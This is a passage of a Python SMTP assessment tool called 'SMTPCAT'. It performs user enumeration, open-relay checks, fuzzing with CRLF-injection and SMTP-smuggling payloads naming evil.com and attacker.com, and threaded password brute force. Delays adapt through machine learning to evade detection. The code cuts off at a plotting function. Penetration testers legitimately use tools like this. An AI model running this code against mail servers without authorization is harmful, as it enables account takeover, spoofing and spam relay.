#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗███╗   ███╗████████╗██████╗  ██████╗ █████╗ ████████╗  ║
║   ██╔════╝████╗ ████║╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝  ║
║   ███████╗██╔████╔██║   ██║   ██████╔╝██║     ███████║   ██║     ║
║   ╚════██║██║╚██╔╝██║   ██║   ██╔═══╝ ██║     ██╔══██║   ██║     ║
║   ███████║██║ ╚═╝ ██║   ██║   ██║     ╚██████╗██║  ██║   ██║     ║
║   ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝     ║
║                                                                   ║
║           Advanced SMTP Security Assessment Tool                   ║
║                      Anonymous-beta                               ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import socket
import smtplib
import time
import argparse
import sys
import logging
import subprocess
import ssl
import re
import random
import statistics
import threading
import concurrent.futures
import curses
import os
import json
from email.mime.text import MIMEText
from typing import List, Optional, Dict, Any, Tuple, Set, Union
from collections import deque, defaultdict
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

# --- Optional Dependencies with Graceful Fallback ---
try:
    import numpy as np
    from sklearn.ensemble import IsolationForest
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("[-] scikit-learn not found. AI anomaly detection disabled.")

try:
    import matplotlib.pyplot as plt
    import matplotlib
    matplotlib.use('Agg')  # Non-interactive backend
    PLOTTING_AVAILABLE = True
except ImportError:
    PLOTTING_AVAILABLE = False
    print("[-] matplotlib not found. Graphing disabled.")

try:
    import dns.resolver
    import dns.reversename
    NETWORK_EXTRAS = True
except ImportError:
    NETWORK_EXTRAS = False
    print("[-] dnspython not found. DNS/MTA-STS checks limited.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[-] requests not found. HTTP-based checks limited.")

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[-] PySocks not found. SOCKS proxy disabled.")

# --- Logging Setup ---
logging.basicConfig(
    filename='smtpcat.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# --- Global Configuration ---
DEFAULT_TIMEOUT = 10
SLOW_ATTACK_MIN = 0.5
SLOW_ATTACK_MAX = 2.0
BURST_DELAY = 0.1
CURRENT_DELAY_MIN = SLOW_ATTACK_MIN
CURRENT_DELAY_MAX = SLOW_ATTACK_MAX
CURRENT_BURST = BURST_DELAY

EHLO_DOMAINS = [
    "mail.attacker.com", "outlook.microsoft.com", "google.com",
    "yahoo.com", "apple.com", "local.host", "internal.network",
    "smtp.isp.net", "admin.company.net", "secure.server"
]

INTERNAL_DOMAINS = [
    "example.com", "internal.corp", "localhost", "mail.local",
    "smtp.local", "test.local", "dev.corp"
]

# --- SMTP Reply Codes ---
SMTP_REPLIES = {
    '220': 'Service ready',
    '221': 'Closing channel',
    '250': 'OK',
    '251': 'Forwarding',
    '252': 'Cannot verify',
    '354': 'Start mail input',
    '421': 'Service unavailable',
    '450': 'Mailbox unavailable',
    '451': 'Local error',
    '452': 'Insufficient storage',
    '500': 'Syntax error',
    '501': 'Parameter error',
    '502': 'Not implemented',
    '503': 'Bad sequence',
    '504': 'Parameter not implemented',
    '550': 'Mailbox unavailable',
    '551': 'User not local',
    '552': 'Storage exceeded',
    '553': 'Mailbox name not allowed',
    '554': 'Transaction failed'
}

# --- Fuzzing Payloads (Expanded) ---
FUZZ_PAYLOADS = {
    "generic": [
        b"\x00", b"\xff", b"\x0a\x0d", b"A"*1000, b"%", b"$", b"!",
        b"@", b"#", b"'", b"\"", b"--", b";", b"|", b"X"*2048
    ],
    "injection": [
        b"\r\nMAIL FROM:<injected@evil.com>\r\n",
        b"\r\nRCPT TO:<injected@evil.net>\r\n",
        b"\r\nQUIT\r\n",
        b"\r\nHELO evil.com\r\n",
        b"\r\nNOOP\r\n"
    ],
    "smuggling": [
        b"\r\n.\r\n",
        b"\n.\n",
        b"\r.\r",
        b"\r\n.\n",
        b"\n.\r\n",
        b"\r\n.\r\nMAIL FROM:<spoof@attacker.com>\r\n",
        b"\r\n.\r\nRCPT TO:<secret@target.com>\r\n"
    ],
    "format_string": [
        b"%s%n%x%d%f",
        b"%%.100s",
        b"%d%d%d%d%d%d%d%d%d%d"
    ]
}

# --- Known CVEs (Expanded) ---
KNOWN_CVES = {
    "CVE-2025-26794": {
        "desc": "Exim 4.98 SQL injection via SQLite hints",
        "pattern": r"Exim (\d+\.\d+(?:\.\d+)?)",
        "vuln_range": [("<=4.98", "4.98.1")],
        "features": ["SQLITE"],
        "remediation": "Upgrade to Exim 4.98.1+",
        "impact": "High"
    },
    "CVE-2025-30232": {
        "desc": "Exim 4.96-4.98.1 use-after-free",
        "pattern": r"Exim (\d+\.\d+(?:\.\d+)?)",
        "vuln_range": [(">=4.96", "<=4.98.1")],
        "features": [],
        "remediation": "Upgrade to Exim 4.98.2+",
        "impact": "Critical"
    },
    "CVE-2024-27305": {
        "desc": "aiosmtpd SMTP smuggling",
        "pattern": r"aiosmtpd v?(\d+\.\d+(?:\.\d+)?)",
        "vuln_range": [("<=1.4.4", None)],
        "features": ["SMTP_SMUGGLING"],
        "remediation": "Upgrade to aiosmtpd 1.4.4.post2+",
        "impact": "Medium"
    },
    "CVE-2024-27938": {
        "desc": "Postal SMTP smuggling (<3.0.0)",
        "pattern": r"Postal v?(\d+\.\d+(?:\.\d+)?)",
        "vuln_range": [(None, "<3.0.0")],
        "features": ["SMTP_SMUGGLING"],
        "remediation": "Upgrade to Postal 3.0.0+",
        "impact": "Medium"
    },
    "WEAKNESS-VRFY-EXPN": {
        "desc": "User enumeration via VRFY/EXPN",
        "pattern": r".*",
        "vuln_range": [],
        "features": ["VRFY", "EXPN"],
        "remediation": "Disable VRFY/EXPN or require auth",
        "impact": "Medium"
    },
    "WEAKNESS-OPEN-RELAY": {
        "desc": "Open relay configuration",
        "pattern": r".*",
        "vuln_range": [],
        "features": ["OPEN_RELAY"],
        "remediation": "Configure strict relay policies",
        "impact": "Critical"
    }
}

# --- Proxy Settings ---
PROXY_SETTINGS = {'host': None, 'port': None, 'type': None}

# --- AI/ML State ---
if ML_AVAILABLE:
    ISOLATION_WINDOW = 150
    IF_CONTAMINATION = 0.03
    isolation_model = None
    response_data = deque(maxlen=ISOLATION_WINDOW)


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def get_random_ehlo() -> str:
    return random.choice(EHLO_DOMAINS)

def create_raw_socket(target: str, port: int, timeout: int = DEFAULT_TIMEOUT) -> socket.socket:
    """Create socket with proxy support."""
    if SOCKS_AVAILABLE and PROXY_SETTINGS.get('host') and PROXY_SETTINGS.get('type') == 'socks5':
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_proxy(socks.SOCKS5, PROXY_SETTINGS['host'], PROXY_SETTINGS['port'])
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target, port))
    return s

def read_smtp_response(sock: socket.socket, timeout: int = DEFAULT_TIMEOUT) -> str:
    """Read complete SMTP response (handles multi-line)."""
    buf = b""
    start = time.time()
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            lines = buf.split(b'\r\n')
            if len(lines) > 1 and len(lines[-2]) >= 3 and lines[-2][3:4] == b' ':
                if lines[-2][:3].isdigit():
                    break
        except socket.timeout:
            break
        if time.time() - start > timeout:
            break
    return buf.decode('utf-8', errors='ignore').strip()

def safe_decode(data: bytes) -> str:
    return data.decode('utf-8', errors='ignore')


# ============================================================================
# CORE SMTP FUNCTIONS
# ============================================================================

def grab_banner(target: str, port: int = 25) -> Optional[str]:
    """Grab SMTP banner."""
    try:
        sock = create_raw_socket(target, port)
        banner = read_smtp_response(sock)
        sock.close()
        logging.info(f"Banner from {target}:{port}: {banner}")
        return banner
    except Exception as e:
        logging.error(f"Banner grab failed: {e}")
        return None

def check_starttls(target: str, port: int = 25) -> Tuple[bool, List[str]]:
    """Check STARTTLS and enumerate ESMTP extensions."""
    extensions = []
    try:
        sock = create_raw_socket(target, port)
        banner = read_smtp_response(sock)
        if not banner.startswith('220'):
            sock.close()
            return False, []
        
        sock.send(f"EHLO {get_random_ehlo()}\r\n".encode())
        resp = read_smtp_response(sock)
        sock.close()
        
        for line in resp.splitlines():
            if line.startswith("250-") or line.startswith("250 "):
                ext = line[4:].strip().upper()
                if ext:
                    extensions.append(ext)
        
        starttls = "STARTTLS" in extensions
        logging.info(f"STARTTLS: {starttls}, Extensions: {extensions}")
        return starttls, extensions
    except Exception as e:
        logging.error(f"STARTTLS check failed: {e}")
        return False, []

def connect_smtp(target: str, port: int, use_tls: bool = False, timeout: int = DEFAULT_TIMEOUT) -> Optional[smtplib.SMTP]:
    """Establish SMTP connection with TLS support."""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    try:
        context.minimum_version = ssl.TLSVersion.TLSv1_2
    except AttributeError:
        pass
    
    ehlo_domain = get_random_ehlo()
    
    # Try SMTPS (port 465)
    if port == 465 or (use_tls and port in [25, 587]):
        try:
            if SOCKS_AVAILABLE and PROXY_SETTINGS.get('host'):
                sock = create_raw_socket(target, port, timeout)
                server = smtplib.SMTP_SSL(target, port, timeout=timeout, context=context, _socket=sock)
            else:
                server = smtplib.SMTP_SSL(target, port, timeout=timeout, context=context)
            server.ehlo(ehlo_domain)
            logging.info(f"SMTPS connected to {target}:{port}")
            return server
        except Exception as e:
            logging.debug(f"SMTPS failed: {e}")
    
    # Plain SMTP + STARTTLS
    try:
        if SOCKS_AVAILABLE and PROXY_SETTINGS.get('host'):
            sock = create_raw_socket(target, port, timeout)
            server = smtplib.SMTP(target, port, timeout=timeout, _socket=sock)
        else:
            server = smtplib.SMTP(target, port, timeout=timeout)
        
        server.ehlo(ehlo_domain)
        ehlo_resp = server.ehlo_resp.decode() if server.ehlo_resp else ""
        
        if "STARTTLS" in ehlo_resp.upper() and use_tls:
            server.starttls(context=context)
            server.ehlo(ehlo_domain)
            logging.info(f"STARTTLS upgraded on {target}:{port}")
        
        return server
    except Exception as e:
        logging.debug(f"SMTP connection failed: {e}")
        return None


# ============================================================================
# AI/ML ANOMALY DETECTION
# ============================================================================

if ML_AVAILABLE:
    def classify_anomaly(response_time: float, response_code: int) -> float:
        """Classify response as anomalous using Isolation Forest."""
        global isolation_model, response_data
        response_data.append([response_time, float(response_code)])
        
        if len(response_data) < 20:
            return 0.0
        
        data_array = np.array(list(response_data))
        
        if isolation_model is None or len(response_data) == ISOLATION_WINDOW:
            try:
                isolation_model = IsolationForest(
                    random_state=42,
                    contamination=IF_CONTAMINATION,
                    n_estimators=200,
                    n_jobs=-1
                )
                isolation_model.fit(data_array)
                logging.info("Isolation Forest retrained")
            except Exception as e:
                logging.error(f"ML training failed: {e}")
                return 0.0
        
        try:
            score = isolation_model.decision_function([[response_time, float(response_code)]])[0]
            return score
        except Exception:
            return 0.0
    
    def adjust_delay(anomaly_score: float):
        """Dynamically adjust attack delays based on anomaly score."""
        global CURRENT_DELAY_MIN, CURRENT_DELAY_MAX, CURRENT_BURST
        
        if anomaly_score < -0.3:
            CURRENT_DELAY_MIN = min(CURRENT_DELAY_MIN * 2, SLOW_ATTACK_MAX * 2)
            CURRENT_DELAY_MAX = min(CURRENT_DELAY_MAX * 2, SLOW_ATTACK_MAX * 2)
            CURRENT_BURST = min(CURRENT_BURST * 5, SLOW_ATTACK_MAX)
            logging.critical(f"Critical anomaly: delays increased to {CURRENT_DELAY_MIN:.2f}")
        elif anomaly_score < -0.1:
            CURRENT_DELAY_MIN = min(CURRENT_DELAY_MIN * 1.5, SLOW_ATTACK_MAX)
            CURRENT_DELAY_MAX = min(CURRENT_DELAY_MAX * 1.5, SLOW_ATTACK_MAX)
            CURRENT_BURST = min(CURRENT_BURST * 2, SLOW_ATTACK_MAX / 2)
            logging.warning(f"Moderate anomaly: delays increased")
        elif anomaly_score > 0.3 and CURRENT_DELAY_MIN > SLOW_ATTACK_MIN:
            CURRENT_DELAY_MIN = max(CURRENT_DELAY_MIN * 0.8, SLOW_ATTACK_MIN)
            CURRENT_DELAY_MAX = max(CURRENT_DELAY_MAX * 0.8, SLOW_ATTACK_MIN * 2)
            CURRENT_BURST = max(CURRENT_BURST * 0.5, BURST_DELAY)
            logging.info(f"Normal behavior: delays decreased")
        
        CURRENT_DELAY_MIN = max(CURRENT_DELAY_MIN, BURST_DELAY / 2)
        CURRENT_DELAY_MAX = max(CURRENT_DELAY_MAX, CURRENT_DELAY_MIN * 1.5)


# ============================================================================
# USER ENUMERATION
# ============================================================================

def enum_vrfy(target: str, users: List[str], port: int = 25) -> List[str]:
    """VRFY-based user enumeration with adaptive delays."""
    valid = []
    server = connect_smtp(target, port)
    if not server:
        logging.error("VRFY: Could not connect")
        return valid
    
    print(f"\n[*] VRFY enumeration: {len(users)} users")
    
    for user in users:
        try:
            start = time.time()
            code, msg = server.vrfy(user)
            elapsed = time.time() - start
            resp = safe_decode(msg).strip()
            
            if code in [250, 252]:
                print(f"[+] Valid: {user} ({resp[:50]})")
                logging.info(f"VRFY valid: {user} -> {resp}")
                valid.append(user)
            else:
                logging.debug(f"VRFY invalid: {user} -> {code} {resp[:50]}")
            
            if ML_AVAILABLE:
                anomaly_score = classify_anomaly(elapsed, code)
                adjust_delay(anomaly_score)
            
            time.sleep(random.uniform(CURRENT_DELAY_MIN, CURRENT_DELAY_MAX))
        except smtplib.SMTPServerDisconnected:
            logging.warning(f"VRFY: Server disconnected for {user}, reconnecting")
            server = connect_smtp(target, port)
            if not server:
                break
        except Exception as e:
            logging.error(f"VRFY error for {user}: {e}")
    
    if server:
        try:
            server.quit()
        except:
            pass
    return valid

def enum_expn(target: str, lists: List[str], port: int = 25) -> Dict[str, str]:
    """EXPN-based mailing list enumeration."""
    results = {}
    server = connect_smtp(target, port)
    if not server:
        return results
    
    print(f"\n[*] EXPN enumeration: {len(lists)} lists")
    
    for list_name in lists:
        try:
            start = time.time()
            code, msg = server.expn(list_name)
            elapsed = time.time() - start
            resp = safe_decode(msg).strip()
            
            if code == 250:
                print(f"[+] EXPN {list_name}: {resp[:80]}")
                results[list_name] = resp
                logging.info(f"EXPN {list_name}: {resp}")
            
            if ML_AVAILABLE:
                anomaly_score = classify_anomaly(elapsed, code)
                adjust_delay(anomaly_score)
            
            time.sleep(random.uniform(CURRENT_DELAY_MIN, CURRENT_DELAY_MAX))
        except Exception as e:
            logging.error(f"EXPN error for {list_name}: {e}")
    
    if server:
        try:
            server.quit()
        except:
            pass
    return results

def enum_rcpt(
    target: str,
    users: List[str],
    domains: List[str],
    sender: str = "test@example.com",
    port: int = 25,
    attempts: int = 3
) -> Tuple[List[str], Dict[str, List[float]]]:
    """
    RCPT TO-based enumeration with timing analysis.
    Returns (valid_users, timing_data)
    """
    valid = set()
    timing_data = {'valid': [], 'invalid': [], 'anomalous': []}
    
    print(f"\n[*] RCPT TO enumeration: {len(users)} users × {len(domains)} domains × {attempts} attempts")
    
    for domain in domains:
        print(f"[+] Testing domain: {domain}")
        sender_email = f"test@{domain}"
        
        for user in users:
            recipient = f"{user}@{domain}"
            times = []
            
            for attempt in range(attempts):
                server = connect_smtp(target, port)
                if not server:
                    break
                
                try:
                    server.mail(sender_email)
                    start = time.time()
                    code, msg = server.rcpt(recipient)
                    elapsed = time.time() - start
                    times.append(elapsed)
                    resp = safe_decode(msg).strip()
                    
                    if code == 250:
                        valid.add(recipient)
                        timing_data['valid'].append(elapsed)
                        print(f"[+] Valid: {recipient} ({elapsed:.4f}s)")
                        logging.info(f"RCPT valid: {recipient} -> {resp[:50]}")
                    elif code in [550, 551, 553]:
                        timing_data['invalid'].append(elapsed)
                        logging.debug(f"RCPT invalid: {recipient} -> {code} {resp[:50]}")
                    else:
                        timing_data['anomalous'].append(elapsed)
                        logging.warning(f"RCPT anomalous: {recipient} -> {code} {resp[:50]}")
                    
                    if ML_AVAILABLE:
                        score = classify_anomaly(elapsed, code)
                        adjust_delay(score)
                    
                    time.sleep(random.uniform(CURRENT_BURST, CURRENT_BURST * 2))
                except Exception as e:
                    logging.error(f"RCPT error for {recipient}: {e}")
                finally:
                    try:
                        server.quit()
                    except:
                        pass
            
            # Timing analysis for this user across attempts
            if len(times) > 1 and ML_AVAILABLE:
                avg_time = statistics.mean(times)
                if avg_time > 1.5:  # Heuristic threshold
                    if recipient not in valid:
                        timing_data['anomalous'].append(avg_time)
                        print(f"[!] Timing anomaly: {recipient} (avg {avg_time:.4f}s)")
                        logging.info(f"Timing anomaly: {recipient} -> {avg_time:.4f}s")
    
    return list(valid), timing_data


# ============================================================================
# OPEN RELAY DETECTION
# ============================================================================

def check_open_relay(
    target: str,
    port: int = 25,
    from_emails: Optional[List[str]] = None,
    to_emails: Optional[List[str]] = None
) -> bool:
    """Aggressive open relay detection with expanded test vectors."""
    if not from_emails:
        from_emails = [
            f"test@{d}" for d in INTERNAL_DOMAINS
        ] + ["attacker@evil.com", "spoof@target.com"]
    if not to_emails:
        to_emails = ["external@example.com", "victim@outside.net"]
    
    print(f"\n[*] Open relay check: {len(from_emails)} from × {len(to_emails)} to")
    
    for from_addr in from_emails[:10]:
        for to_addr in to_emails[:5]:
            server = connect_smtp(target, port)
            if not server:
                continue
            try:
                server.mail(from_addr)
                server.rcpt(to_addr)
                print(f"[!!!] OPEN RELAY: {from_addr} -> {to_addr}")
                logging.critical(f"Open relay confirmed: {from_addr} -> {to_addr}")
                try:
                    server.quit()
                except:
                    pass
                return True
            except smtplib.SMTPRecipientsRefused:
                logging.debug(f"Relay rejected: {from_addr} -> {to_addr}")
            except Exception as e:
                logging.debug(f"Relay check error: {e}")
            finally:
                try:
                    server.quit()
                except:
                    pass
            time.sleep(random.uniform(CURRENT_BURST, CURRENT_BURST * 3))
    
    return False


# ============================================================================
# SMTP FUZZING / INJECTION TESTING
# ============================================================================

def fuzz_smtp(target: str, port: int = 25) -> List[Dict[str, Any]]:
    """Comprehensive SMTP fuzzing and injection testing."""
    findings = []
    total_tests = 0
    completed = 0
    
    commands = [
        ("HELO", "test.com"),
        ("EHLO", "test.com"),
        ("MAIL FROM:", "<test@x.com>"),
        ("RCPT TO:", "<test@x.com>"),
        ("DATA", ""),
        ("AUTH PLAIN", "VXNlcjExOkxvbGxhYnllMTIz"),
        ("RSET", ""),
        ("QUIT", "")
    ]
    
    for cmd_type, payloads in FUZZ_PAYLOADS.items():
        total_tests += len(payloads) * len(commands)
    
    print(f"\n[*] Fuzzing: {total_tests} test cases")
    
    for cmd, default_arg in commands:
        for ptype, payloads in FUZZ_PAYLOADS.items():
            for payload in payloads:
                completed += 1
                payload_str = safe_decode(payload)[:100]
                
                try:
                    sock = create_raw_socket(target, port)
                    banner = read_smtp_response(sock)
                    if not banner.startswith('220'):
                        sock.close()
                        continue
                    
                    # Construct command
                    if cmd == "DATA":
                        full_cmd = (
                            b"HELO x.com\r\n"
                            b"MAIL FROM:<a@x.com>\r\n"
                            b"RCPT TO:<b@x.com>\r\n"
                            b"DATA\r\n"
                            b"Subject: Fuzz Test\r\n\r\n"
                            + payload + b"\r\n.\r\n"
                        )
                        display_cmd = "SMUGGLE(DATA)"
                    elif cmd == "AUTH PLAIN":
                        full_cmd = b"AUTH PLAIN " + payload + b"\r\n"
                        display_cmd = "AUTH PLAIN(FUZZ)"
                    else:
                        full_cmd = f"{cmd} {default_arg}{payload_str}\r\n".encode('latin-1', errors='ignore')
                        display_cmd = f"{cmd}(FUZZ)"
                    
                    sock.send(full_cmd)
                    resp = read_smtp_response(sock)
                    sock.close()
                    
                    code = resp.split()[0] if resp and resp.split()[0].isdigit() else "000"
                    
                    # Analyze response
                    if code in ["250", "354"] and ptype != "smuggling":
                        findings.append({
                            'command': display_cmd,
                            'payload': payload_str[:200],
                            'response': resp[:200],
                            'type': 'accepted_malformed',
                            'category': ptype
                        })
                        print(f"[!] Accepted malformed: {display_cmd} -> {code}")
                        logging.warning(f"Fuzzing: {display_cmd} accepted {code}")
                    elif code.startswith("5") and code not in ["500", "501", "503", "504"]:
                        findings.append({
                            'command': display_cmd,
                            'payload': payload_str[:200],
                            'response': resp[:200],
                            'type': 'unexpected_error',
                            'category': ptype
                        })
                        print(f"[!] Unexpected error: {display_cmd} -> {code}")
                        logging.warning(f"Fuzzing: {display_cmd} -> {code}")
                    elif "debug" in resp.lower() or "stack trace" in resp.lower():
                        findings.append({
                            'command': display_cmd,
                            'payload': payload_str[:200],
                            'response': resp[:200],
                            'type': 'debug_leak',
                            'category': ptype
                        })
                        print(f"[!!!] Debug leak: {display_cmd}")
                        logging.critical(f"Debug leak in {display_cmd}: {resp[:200]}")
                    elif display_cmd == "SMUGGLE(DATA)" and ("250" in resp or "221" in resp):
                        findings.append({
                            'command': display_cmd,
                            'payload': payload_str[:200],
                            'response': resp[:200],
                            'type': 'smtp_smuggling',
                            'category': ptype
                        })
                        print(f"[!!!] SMTP SMUGGLING: {display_cmd}")
                        logging.critical(f"SMTP smuggling in {display_cmd}: {resp[:200]}")
                    
                    time.sleep(random.uniform(CURRENT_BURST / 2, CURRENT_BURST))
                except socket.timeout:
                    findings.append({
                        'command': display_cmd,
                        'payload': payload_str[:200],
                        'response': 'Timeout',
                        'type': 'timeout',
                        'category': ptype
                    })
                    logging.warning(f"Fuzzing timeout: {display_cmd}")
                except Exception as e:
                    logging.error(f"Fuzzing error: {display_cmd} -> {e}")
                
                # Progress indicator
                sys.stdout.write(f"\r  Progress: {completed}/{total_tests}")
                sys.stdout.flush()
    
    print(f"\n[+] Fuzzing complete. {len(findings)} anomalies found.")
    return findings


# ============================================================================
# BRUTE FORCE
# ============================================================================

def brute_force(
    target: str,
    port: int,
    users: List[str],
    passwords: List[str],
    use_tls: bool = False,
    max_workers: int = 5
) -> Tuple[List[Tuple[str, str]], Dict[str, List[float]]]:
    """Concurrent brute force with adaptive delays and lockout detection."""
    successful = []
    lockouts = {}
    timing_data = {'success': [], 'fail': [], 'auth_error': []}
    lock = threading.Lock()
    
    total_attempts = len(users) * len(passwords)
    completed = 0
    
    print(f"\n[*] Brute force: {len(users)} users × {len(passwords)} passwords ({total_attempts} attempts)")
    
    def attempt_login(user: str, password: str):
        nonlocal completed
        if user in lockouts and (time.time() - lockouts[user]) < 300:
            return
        
        server = None
        start = time.time()
        code = 0
        
        try:
            server = connect_smtp(target, port, use_tls)
            if not server:
                with lock:
                    timing_data['fail'].append(time.time() - start)
                    completed += 1
                return
            
            server.login(user, password)
            elapsed = time.time() - start
            with lock:
                print(f"[+] SUCCESS: {user}:{password}")
                logging.critical(f"Brute force success: {user}:{password}")
                successful.append((user, password))
                timing_data['success'].append(elapsed)
                completed += 1
            code = 235
        except smtplib.SMTPAuthenticationError as e:
            elapsed = time.time() - start
            code = e.smtp_code if hasattr(e, 'smtp_code') else 535
            with lock:
                if code in [535, 550, 554]:
                    lockouts[user] = time.time()
                    logging.warning(f"User {user} locked out (code {code})")
                timing_data['auth_error'].append(elapsed)
                completed += 1
        except Exception as e:
            elapsed = time.time() - start
            with lock:
                timing_data['fail'].append(elapsed)
                completed += 1
            logging.error(f"Brute error {user}:{password} -> {e}")
        finally:
            if server:
                try:
                    server.quit()
                except:
                    pass
            if ML_AVAILABLE:
                score = classify_anomaly(time.time() - start, code)
                adjust_delay(score)
            time.sleep(random.uniform(CURRENT_BURST, CURRENT_BURST * 2))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for user in users:
            for password in passwords:
                futures.append(executor.submit(attempt_login, user, password))
        
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result(timeout=30)
            except Exception as e:
                logging.error(f"Thread error: {e}")
            sys.stdout.write(f"\r  Progress: {completed}/{total_attempts} attempts")
            sys.stdout.flush()
    
    print(f"\n[+] Brute force complete. {len(successful)} credentials found.")
    return successful, timing_data


# ============================================================================
# MODERN PROTOCOL CHECKS (MTA-STS, DANE, Cloud)
# ============================================================================

if NETWORK_EXTRAS:
    def check_mta_sts(domain: str) -> Dict[str, Any]:
        """Check MTA-STS policy via DNS TXT and HTTPS."""
        results = {
            'enabled': False,
            'policy_fetched': False,
            'valid_policy': False,
            'notes': []
        }
        
        print(f"\n[*] MTA-STS check for {domain}")
        
        try:
            # DNS TXT
            txt_records = dns.resolver.resolve(f"_mta-sts.{domain}", "TXT")
            for txt in txt_records:
                txt_str = str(txt).strip('"')
                if "v=STSv1" in txt_str and "id=" in txt_str:
                    results['enabled'] = True
                    results['notes'].append(f"TXT: {txt_str}")
                    break
            
            if results['enabled'] and REQUESTS_AVAILABLE:
                # HTTPS fetch
                url = f"https://mta-sts.{domain}/.well-known/mta-sts.txt"
                session = requests.Session()
                if SOCKS_AVAILABLE and PROXY_SETTINGS.get('host'):
                    session.proxies = {'https': f'socks5h://{PROXY_SETTINGS["host"]}:{PROXY_SETTINGS["port"]}'}
                resp = session.get(url, timeout=DEFAULT_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    results['policy_fetched'] = True
                    content = resp.text
                    results['notes'].append(f"Policy fetched from {url}")
                    if "version: STSv1" in content and "mode:" in content:
                        results['valid_policy'] = True
                        results['notes'].append("Policy appears valid")
                else:
                    results['notes'].append(f"HTTP {resp.status_code} from {url}")
        except dns.resolver.NXDOMAIN:
            results['notes'].append("No _mta-sts TXT record")
        except Exception as e:
            results['notes'].append(f"Error: {str(e)[:100]}")
        
        return results
    
    def check_dane(domain: str, port: int = 25) -> Dict[str, Any]:
        """Check DANE TLSA records."""
        results = {
            'enabled': False,
            'tlsa_records': [],
            'notes': []
        }
        
        print(f"\n[*] DANE check for {domain}:{port}")
        
        try:
            query = f"_{port}._tcp.{domain}"
            tlsa = dns.resolver.resolve(query, "TLSA")
            if tlsa:
                results['enabled'] = True
                for rec in tlsa:
                    results['tlsa_records'].append(str(rec))
                    results['notes'].append(f"TLSA: {rec}")
                print(f"[+] DANE TLSA records found")
        except dns.resolver.NXDOMAIN:
            results['notes'].append(f"No TLSA records for {query}")
        except Exception as e:
            results['notes'].append(f"Error: {str(e)[:100]}")
        
        return results
    
    def identify_cloud(target: str) -> Optional[str]:
        """Identify cloud/SaaS provider from reverse DNS and IP ranges."""
        print(f"\n[*] Cloud provider identification for {target}")
        try:
            ip = socket.gethostbyname(target)
            hostname, _, _ = socket.gethostbyaddr(ip)
            hostname_lower = hostname.lower()
            
            patterns = {
                'amazonaws.com': 'AWS SES',
                'azure.com': 'Azure SMTP',
                'google.com': 'Google Cloud',
                'sendgrid.net': 'SendGrid',
                'mailgun.org': 'Mailgun',
                'outlook.com': 'Microsoft 365',
                'protection.outlook.com': 'Microsoft 365',
                'cloudflare.com': 'Cloudflare'
            }
            
            for pattern, provider in patterns.items():
                if pattern in hostname_lower:
                    print(f"[+] Cloud provider: {provider} ({hostname})")
                    return f"{provider} ({hostname})"
            
            print("[-] Not identified as cloud/SaaS provider")
            return None
        except Exception as e:
            logging.error(f"Cloud identification failed: {e}")
            return None
else:
    def check_mta_sts(*args, **kwargs):
        return {'enabled': False, 'notes': ['dnspython not installed']}
    def check_dane(*args, **kwargs):
        return {'enabled': False, 'notes': ['dnspython not installed']}
    def identify_cloud(*args, **kwargs):
        return None


# ============================================================================
# CVE MATCHING
# ============================================================================

def match_cves(
    banner: Optional[str],
    extensions: List[str],
    open_relay: bool,
    injection_findings: List[Dict]
) -> List[Dict[str, str]]:
    """Match collected data against known CVE database."""
    found = []
    
    for cve_id, info in KNOWN_CVES.items():
        vulnerable = False
        
        # Version matching
        if banner and info.get('pattern'):
            match = re.search(info['pattern'], banner, re.IGNORECASE)
            if match:
                version = match.group(match.lastindex) if match.lastindex else None
                if version and info.get('vuln_range'):
                    # Simplified version check
                    vulnerable = True  # Would need proper version comparison
                    logging.info(f"Version match for {cve_id}: {version}")
        
        # Feature-based matching
        if "VRFY" in info.get('features', []) and "VRFY" in extensions:
            vulnerable = True
        if "EXPN" in info.get('features', []) and "EXPN" in extensions:
            vulnerable = True
        if "OPEN_RELAY" in info.get('features', []) and open_relay:
            vulnerable = True
        if "SMTP_SMUGGLING" in info.get('features', []) and injection_findings:
            for f in injection_findings:
                if f.get('type') == 'smtp_smuggling':
                    vulnerable = True
                    break
        
        if vulnerable:
            found.append({
                'id': cve_id,
                'desc': info['desc'],
                'remediation': info['remediation'],
                'impact': info.get('impact', 'Unknown')
            })
            logging.warning(f"CVE match: {cve_id} -> {info['desc'][:50]}")
    
    return found


# ============================================================================
# NMAP INTEGRATION
# ============================================================================

def run_nmap(target: str, port: int = 25) -> Optional[str]:
    """Run targeted Nmap scripts for SMTP."""
    scripts = [
        "smtp-commands",
        "smtp-enum-users",
        "smtp-open-relay",
        "smtp-vuln-cve2010-0432",
        "smtp-ntlm-info",
        "smtp-starttls-detection"
    ]
    cmd = ["nmap", "-p", str(port), "-sV", "--version-all", "--script", ",".join(scripts), target]
    
    print(f"\n[*] Nmap scan: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout
        print(f"[+] Nmap scan complete")
        logging.info(f"Nmap output: {output[:500]}...")
        return output
    except FileNotFoundError:
        print("[-] Nmap not found")
        return None
    except subprocess.TimeoutExpired:
        print("[-] Nmap timed out")
        return None
    except Exception as e:
        print(f"[-] Nmap error: {e}")
        return None


# ============================================================================
# PLOTTING / VISUALIZATION
# ============================================================================

if PLOTTING_AVAILABLE:
    def plot_timing_data(timing_data: Dict[str, List[float]], title: str, filename: str):
        """Generate box plot of timing data."""
